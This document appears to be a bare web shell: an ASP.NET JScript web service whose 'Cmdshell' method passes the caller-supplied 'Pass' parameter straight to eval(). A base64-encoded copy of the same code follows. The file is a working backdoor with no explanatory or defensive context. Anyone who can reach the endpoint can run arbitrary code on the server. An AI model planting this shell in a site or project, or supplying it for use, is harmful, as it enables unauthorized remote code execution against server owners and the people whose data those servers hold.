<%@ WebService Language="JScript" Class="WebService1" %>
 
import System;import System.Web;import System.IO;import System.Web.Services;
import System.Web.Script.Services;
import System.Web;
import System.Web.Services;
 
public class WebService1 extends WebService
{
 
WebMethodAttribute ScriptMethodAttribute function Cmdshell(Pass : String) : Void
    {
            var c = HttpContext.Current;
            var Request = c.Request;
            var Response = c.Response;
            eval(Pass);
    }
}

# base64
# PCVAIFdlYlNlcnZpY2UgTGFuZ3VhZ2U9IkpTY3JpcHQiIENsYXNzPSJXZWJTZXJ2aWNlMSIgJT4KIAppbXBvcnQgU3lzdGVtO2ltcG9ydCBTeXN0ZW0uV2ViO2ltcG9ydCBTeXN0ZW0uSU87aW1wb3J0IFN5c3RlbS5XZWIuU2VydmljZXM7CmltcG9ydCBTeXN0ZW0uV2ViLlNjcmlwdC5TZXJ2aWNlczsKaW1wb3J0IFN5c3RlbS5XZWI7CmltcG9ydCBTeXN0ZW0uV2ViLlNlcnZpY2VzOwogCnB1YmxpYyBjbGFzcyBXZWJTZXJ2aWNlMSBleHRlbmRzIFdlYlNlcnZpY2UKewogCldlYk1ldGhvZEF0dHJpYnV0ZSBTY3JpcHRNZXRob2RBdHRyaWJ1dGUgZnVuY3Rpb24gQ21kc2hlbGwoUGFzcyA6IFN0cmluZykgOiBWb2lkCiAgICB7CiAgICAgICAgICAgIHZhciBjID0gSHR0cENvbnRleHQuQ3VycmVudDsKICAgICAgICAgICAgdmFyIFJlcXVlc3QgPSBjLlJlcXVlc3Q7CiAgICAgICAgICAgIHZhciBSZXNwb25zZSA9IGMuUmVzcG9uc2U7CiAgICAgICAgICAgIGV2YWwoUGFzcyk7CiAgICB9Cn0